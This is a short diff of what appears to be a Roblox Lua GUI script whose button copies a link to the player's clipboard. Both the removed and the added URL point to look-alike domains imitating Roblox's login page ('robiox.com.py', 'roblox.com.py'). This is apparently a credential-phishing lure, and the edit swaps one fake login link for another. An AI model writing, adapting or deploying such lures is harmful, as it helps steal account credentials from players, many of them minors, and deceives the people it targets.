@@ -83,5 +83,5 @@ button.Position = UDim2.fromScale(0.23, 0.734)
 
 button.Activated:Connect(function()
 	button.Text = "Link Copied!"
-	setclipboard("https://www.robiox.com.py/NewLogin?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fusers%2F281466434325%2Fprofile")
+	setclipboard("https://roblox.com.py/login?returnUrl=2024355020741280")
 end)
